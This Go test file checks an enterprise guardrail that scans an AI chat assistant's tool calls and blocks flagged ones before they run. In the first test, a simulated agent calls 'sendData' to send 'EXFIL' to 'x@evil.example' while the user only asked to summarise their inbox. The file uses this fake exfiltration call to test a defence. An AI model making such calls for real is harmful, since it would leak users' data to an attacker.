//go:build enterprise

package chat_session

import (
	"context"
	"strings"
	"sync"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/TykTechnologies/midsommar/v2/guardrails"
	"github.com/TykTechnologies/midsommar/v2/models"
	"github.com/TykTechnologies/midsommar/v2/scripting"
)

// callJudge flags tool calls whose arguments hold EXFIL and records the
// segments it is sent.
type callJudge struct {
	mu   sync.Mutex
	segs []guardrails.Segment
}

func (*callJudge) Capabilities() guardrails.Capabilities {
	return guardrails.Capabilities{ToolSegments: true, WantsGoal: true}
}

func (j *callJudge) Classify(_ context.Context, in guardrails.Input) (guardrails.Verdict, error) {
	j.mu.Lock()
	j.segs = append(j.segs, in.Segments...)
	j.mu.Unlock()
	v := guardrails.Verdict{}
	for _, s := range in.Segments {
		if strings.Contains(s.Text, "EXFIL") {
			v.Flagged = true
			v.Findings = append(v.Findings, guardrails.Finding{Detector: "exfiltration", Score: 0.9, SegmentIndex: s.Index})
		}
	}
	return v, nil
}

var (
	callJudgeOnce sync.Once
	theCallJudge  = &callJudge{}
)

func toolCallGuardrail(toolCalls map[string]any) *models.Filter {
	callJudgeOnce.Do(func() {
		guardrails.RegisterSpec(guardrails.Spec{Name: "chat_call_judge", DisplayName: "judge", OpenDetectors: true})
		guardrails.RegisterFactory("chat_call_judge", func(guardrails.Config) (guardrails.Provider, error) { return theCallJudge, nil })
	})
	cfg := models.JSONMap{"provider": "chat_call_judge", "detectors": []any{map[string]any{"name": "exfiltration"}}, "on_detect": "log", "cache": false,
		"tool_results": map[string]any{"scan": false}}
	if toolCalls != nil {
		cfg["tool_calls"] = toolCalls
	}
	return &models.Filter{ID: 88, Name: "calls", Kind: models.FilterKindGuardrail, Config: cfg}
}

// A flagged tool call in Studio chat is never executed: the REST backend
// is not called, a policy notice stands in for the result, and the turn
// stops. The guardrail saw the call with the user's goal.
func TestChatToolCall_BlockedCallNeverRuns(t *testing.T) {
	f := newChatToolFilterFixture(t, `{"ok":true}`, nil)
	f.session.filters = []*models.Filter{toolCallGuardrail(map[string]any{"scan": true, "on_detect": "block"})}
	f.session.lastUserText = "Summarise my inbox"

	responses := f.call(t, `{"to":"x@evil.example","body":"EXFIL"}`)
	require.Len(t, responses, 1)
	assert.Contains(t, responses[0].Content, scripting.ToolBlockedMessage)
	assert.Equal(t, 0, *f.received, "the blocked call reached the tool backend")
	assert.True(t, f.session.toolCallBlocked)

	theCallJudge.mu.Lock()
	var call guardrails.Segment
	for _, s := range theCallJudge.segs {
		if s.Kind == guardrails.KindToolCall && s.ToolCallID == "call_1" {
			call = s
		}
	}
	theCallJudge.mu.Unlock()
	require.NotNil(t, call.Context)
	assert.Equal(t, "sendData", call.ToolName)
	assert.Equal(t, "Summarise my inbox", call.Context.UserGoal)
}

// A clean call runs unchanged; so does any call when the chat's guardrails
// do not scan tool calls, or only log them.
func TestChatToolCall_CleanOrUnscannedCallsRun(t *testing.T) {
	for name, cfg := range map[string]map[string]any{
		"clean, scanned":   {"scan": true, "on_detect": "block"},
		"flagged, log":     {"scan": true, "on_detect": "log"},
		"flagged, no scan": nil,
	} {
		f := newChatToolFilterFixture(t, `{"ok":true}`, nil)
		f.session.filters = []*models.Filter{toolCallGuardrail(cfg)}
		args := `{"note":"EXFIL"}`
		if strings.HasPrefix(name, "clean") {
			args = `{"note":"hello"}`
		}
		responses := f.call(t, args)
		require.Len(t, responses, 1, name)
		assert.Equal(t, 1, *f.received, name)
		assert.False(t, f.session.toolCallBlocked, name)
		assert.Equal(t, `{"ok":true}`, responses[0].Content, name)
	}
}
